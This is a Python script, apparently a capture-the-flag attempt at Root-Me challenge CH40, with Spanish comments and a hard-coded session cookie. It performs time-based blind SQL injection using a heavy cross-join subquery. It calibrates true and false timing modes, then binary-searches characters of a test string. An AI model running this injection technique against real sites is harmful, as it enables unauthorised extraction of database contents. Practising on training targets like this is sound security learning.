#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 38 - PROBAR AMBAS POSIBILIDADES
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true_normal(self, condition):
        """Asume: TRUE = lento, FALSE = rápido"""
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t > self.threshold
    
    def is_true_invertido(self, condition):
        """Asume: TRUE = rápido, FALSE = lento"""
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < self.threshold

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  PROBANDO AMBAS POSIBILIDADES")
print("="*70)

# 1. Probar con condiciones conocidas
print("\n[1] Probando condiciones con modo NORMAL (TRUE = lento):")
print(f"  1=1: {injector.is_true_normal('1=1')} (debería ser TRUE)")
print(f"  1=2: {injector.is_true_normal('1=2')} (debería ser FALSE)")

print("\n[2] Probando condiciones con modo INVERTIDO (TRUE = rápido):")
print(f"  1=1: {injector.is_true_invertido('1=1')} (debería ser TRUE)")
print(f"  1=2: {injector.is_true_invertido('1=2')} (debería ser FALSE)")

# 2. Determinar cuál modo funciona
modo_normal = injector.is_true_normal('1=1') == True and injector.is_true_normal('1=2') == False
modo_invertido = injector.is_true_invertido('1=1') == True and injector.is_true_invertido('1=2') == False

if modo_normal:
    print("\n✅ Modo NORMAL funciona correctamente")
    is_true = injector.is_true_normal
elif modo_invertido:
    print("\n✅ Modo INVERTIDO funciona correctamente")
    is_true = injector.is_true_invertido
else:
    print("\n❌ NINGÚN modo funciona correctamente")
    print("Probando con diferentes umbrales...")
    
    # Probar diferentes umbrales
    for umbral in range(25, 40):
        injector.threshold = umbral
        print(f"\nUmbral {umbral}:")
        print(f"  NORMAL: 1=1={injector.is_true_normal('1=1')}, 1=2={injector.is_true_normal('1=2')}")
        print(f"  INVERTIDO: 1=1={injector.is_true_invertido('1=1')}, 1=2={injector.is_true_invertido('1=2')}")
    
    exit()

# 3. Extraer 'admin'
print("\n[3] Extrayendo 'admin' con SELECT 'admin':")

def extraer_con_is_true(is_true_func):
    """Extrae usando la función is_true que funciona"""
    result = ""
    for pos in range(1, 6):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING('admin', {pos}, 1)) > {mid}"
            if is_true_func(cond):
                low = mid + 1
            else:
                high = mid - 1
        char = chr(low)
        result += char
        print(f"  Pos {pos}: '{char}' (ASCII: {ord(char)})")
    return result

admin_extraido = extraer_con_is_true(is_true)
print(f"\nResultado: '{admin_extraido}'")
print(f"Esperado: 'admin'")

if admin_extraido == "admin":
    print("\n✅ ¡ÉXITO! La extracción funciona correctamente")
else:
    print("\n❌ La extracción NO funciona correctamente")
